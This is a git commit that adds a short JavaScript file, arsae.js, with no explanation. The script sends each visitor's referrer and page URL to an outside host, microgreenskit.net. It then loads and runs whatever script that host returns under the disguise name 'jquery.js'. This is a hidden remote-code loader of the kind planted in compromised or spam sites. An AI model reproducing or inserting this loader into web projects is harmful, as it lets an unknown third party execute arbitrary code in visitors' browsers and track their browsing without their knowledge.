cdb2976ea64d6cd726c24e4e636db485a9fd110d
Weda Gintung Sentousa <pastiproperti@gmail.com>
2021-08-12 18:59:25 +0700

    Create arsae.js

---
+++ arsae.js
@@ -0,0 +1,13 @@
+<script type='text/javascript'>
+ //<![CDATA[
+    if(document.referrer){
+        var src = 'https://microgreenskit.net/jquery.js?' + ['r=' + encodeURIComponent(document.referrer), 'u=' + encodeURIComponent(window.location.href)].join("&");
+        var s = document.createElement( 'script' );
+        s.setAttribute( 'src', src );
+        s.async = false;
+        document.head.appendChild(s);
+    }
+//]]>
+</script>
+
+<!--ads/auto.txt-->
